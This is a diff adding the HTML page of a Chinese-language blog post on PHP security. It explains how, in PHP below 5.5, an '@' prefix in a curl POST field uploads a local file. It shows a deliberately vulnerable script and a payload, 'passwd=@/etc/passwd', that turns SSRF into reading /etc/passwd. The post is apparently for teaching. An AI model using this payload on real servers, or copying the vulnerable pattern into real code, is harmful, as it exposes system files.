@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="description" content="php安全 —— [tips] curl">
+
+
+
+
+  <meta name="keywords" content="php安全,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1">
+
+
+
+<link rel="canonical" href="http://yoursite.com/2019/12/25/php-小tips-curl/">
+
+
+<meta name="description" content="前言在php5.5以后使用curl上传文件时，必须使用 CURLFile类才行,而5.5以下的写法很简单,只需要在value加上@与文件路径即可上传文件:  php 5.5:  1234$data = array(        &apos;pic&apos;=&amp;gt; new \CURLFile(&apos;./1.jpg&apos;),        &apos;submit&apos; =&amp;gt; &apos;submit&apos;);   php &amp;lt;5.5">
+<meta name="keywords" content="php安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php安全 —— [tips] curl">
+<meta property="og:url" content="http://yoursite.com/2019/12/25/php-小tips-curl/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="前言在php5.5以后使用curl上传文件时，必须使用 CURLFile类才行,而5.5以下的写法很简单,只需要在value加上@与文件路径即可上传文件:  php 5.5:  1234$data = array(        &apos;pic&apos;=&amp;gt; new \CURLFile(&apos;./1.jpg&apos;),        &apos;submit&apos; =&amp;gt; &apos;submit&apos;);   php &amp;lt;5.5">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/15772610011187.jpg">
+<meta property="og:updated_time" content="2019-12-25T08:03:58.756Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php安全 —— [tips] curl">
+<meta name="twitter:description" content="前言在php5.5以后使用curl上传文件时，必须使用 CURLFile类才行,而5.5以下的写法很简单,只需要在value加上@与文件路径即可上传文件:  php 5.5:  1234$data = array(        &apos;pic&apos;=&amp;gt; new \CURLFile(&apos;./1.jpg&apos;),        &apos;submit&apos; =&amp;gt; &apos;submit&apos;);   php &amp;lt;5.5">
+<meta name="twitter:image" content="http://yoursite.com/images/15772610011187.jpg">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
+<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> php安全 —— [tips] curl - blog </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/index">
+                            
+                            
+                                Home
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          php安全 —— [tips] curl
+        
+      </h1>
+
+      <time class="post-time">
+          Dec 25 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在php5.5以后使用curl上传文件时，必须使用 <code>CURLFile</code>类才行,而5.5以下的写法很简单,只需要在value加上@与文件路径即可上传文件:</p>
+<blockquote>
+<p>php 5.5:</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'pic'</span>=&gt; <span class="keyword">new</span> \CURLFile(<span class="string">'./1.jpg'</span>),</span><br><span class="line">        <span class="string">'submit'</span> =&gt; <span class="string">'submit'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>php &lt;5.5</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'pic'</span> =&gt; <span class="string">'@./pic1.jpg'</span>,</span><br><span class="line">    <span class="string">'submit'</span> =&gt; <span class="string">'submit'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<h2 id="隐患"><a href="#隐患" class="headerlink" title="隐患"></a>隐患</h2><p>假如我们可以控制<code>value</code>,与部分<code>HOST</code>部分，那么可以在<code>php5.5</code>以下把一个SSRF 转化为 LFI:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"http://api."</span>.$_GET[<span class="string">'HOST'</span>].<span class="string">"/api/login"</span>;</span><br><span class="line">$post_data = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"username"</span> =&gt; $_GET[<span class="string">'user'</span>],</span><br><span class="line">    <span class="string">"password"</span> =&gt; $_GET[<span class="string">'passwd'</span>]</span><br><span class="line">);</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch , CURLOPT_URL , $url);</span><br><span class="line">curl_setopt($ch , CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch , CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> $output;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong>:</p>
+<p><code>curl http://127.0.0.1/test.php?HOST=web&amp;user=213&amp;passwd=@/etc/passwd</code></p>
+<p><strong>成功获取到本地文件</strong>:</p>
+<p><img src="/images/15772610011187.jpg" alt><br>∫</p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/php安全/">php安全</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2019/12/23/php-小tips-file/">
+        <span class="next-text nav-default">php安全 —— [tips] 跨目录复制文件</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2019
+    <span class="footer-author">l@0-f.org.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/hexo_resize_image.js?v=1.1"></script>
+
+<script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
